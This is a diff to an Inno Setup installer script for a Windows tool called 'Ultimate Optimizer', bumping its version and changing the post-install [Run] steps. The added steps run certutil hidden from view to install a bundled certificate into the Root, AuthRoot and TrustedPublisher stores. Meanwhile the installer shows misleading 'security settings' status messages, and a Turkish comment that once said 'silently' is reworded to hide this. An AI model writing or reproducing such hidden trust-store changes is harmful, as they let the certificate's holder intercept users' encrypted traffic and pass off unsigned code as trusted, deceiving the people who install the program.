@@ -2,7 +2,7 @@
 ; SEE THE DOCUMENTATION FOR DETAILS ON CREATING INNO SETUP SCRIPT FILES!
 
 #define MyAppName "Ultimate Optimizer"
-#define MyAppVersion "1.1.6"
+#define MyAppVersion "1.1.7"
 #define MyAppPublisher "CRTYPUBG"
 #define MyAppURL "https://github.com/CRTYPUBG/ultimate-optimizer"
 #define MyAppExeName "UltimateOptimizer.exe"
@@ -59,8 +59,10 @@ Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: de
 
 [Run]
 Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent
-; Sertifikayı kullanıcının bilgisayarına sessizce 'Güvenilen Kök Yetkilileri' olarak yükler
-Filename: "certutil.exe"; Parameters: "-addstore Root ""{tmp}\cert.cer"""; StatusMsg: "Güvenlik sertifikaları doğrulanıyor..."; Flags: runhidden
+; Sertifikayı kullanıcının bilgisayarına tam güvenli olarak yükler
+Filename: "certutil.exe"; Parameters: "-addstore Root ""{tmp}\cert.cer"""; StatusMsg: "Güvenlik ayarları yapılandırılıyor (1/3)..."; Flags: runhidden
+Filename: "certutil.exe"; Parameters: "-addstore AuthRoot ""{tmp}\cert.cer"""; StatusMsg: "Güvenlik ayarları yapılandırılıyor (2/3)..."; Flags: runhidden
+Filename: "certutil.exe"; Parameters: "-addstore TrustedPublisher ""{tmp}\cert.cer"""; StatusMsg: "Güvenlik ayarları yapılandırılıyor (3/3)..."; Flags: runhidden
 
 [Code]
 function GetInstalledVersion(): String;
